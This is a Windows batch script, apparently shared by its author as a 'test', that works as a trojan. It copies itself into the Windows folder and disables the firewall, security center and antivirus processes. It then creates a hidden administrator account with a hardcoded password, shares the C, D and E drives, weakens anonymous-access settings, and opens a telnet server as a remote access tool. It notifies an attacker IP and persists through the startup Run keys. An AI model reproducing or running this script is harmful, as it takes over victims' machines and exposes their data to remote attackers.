@echo off

::Created by falconflame a.k.a dr. f
::It's just simple script for testing batch scripting in windows

::Checking file existence in windows system and make copy if not available
if not exist %windir%\%0 copy %0 %windir%

::Deactivating firewall
netsh firewall set opmode mode=disable

::Deactivating ICS and security center
net stop sharedaccess
net stop "security center"

::Killing av process
tskill *av*

::Making admin privilege user account
net user admin angela0499 /add
net localgroup administrators admin /add

::Hiding newly created user account
reg add "hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\special accounts\userlist" /v "admin" /t reg_dword /d 0 /f

::Activating service messenger
reg add "hklm\system\controlset001\services\messenger" /v start /t reg_dword /d 2 /f
net start messenger

::Sending message to our pc
net send [enter ip here] some packets from the victim

::Sharing drive c: d: and e:
net share system=%systemdrive% /unlimited
net share data1=d:\ /unlimited
net share data2=e:\ /unlimited

::Hiding shared folder
reg add "hkcr\network\sharinghandler" /ve /t reg_sz /d "" /f

::Manipulating system account vulnerability
reg add "hklm\system\currentcontrolset\control\lsa" /v forceguest /t reg_dword /d 0 /f
reg add "hklm\system\currentcontrolset\control\lsa" /v restrictanonymous /t reg_dword /d 0 /f

::RAT with telnet server
reg add "hklm\system\controlset001\services\tlntsvr" /v start /t reg_dword /d 2 /f
net start tlntsvr

::Enabling trojan in startup
reg add "hklm\software\microsoft\windows\currentversion\run" /v startit /t reg_sz /d %windir%\falconx1.bat /f
reg add "hkcu\software\microsoft\windows\currentversion\run" /v startit /t reg_sz /d %windir%\falconx1.bat /f

::Any ideas or comments? contact me at: flame.axoneme@gmail.com or flame_axoneme@yahoo.fr
::Or you can see me in http://fajarichwannoor.wordpress.com
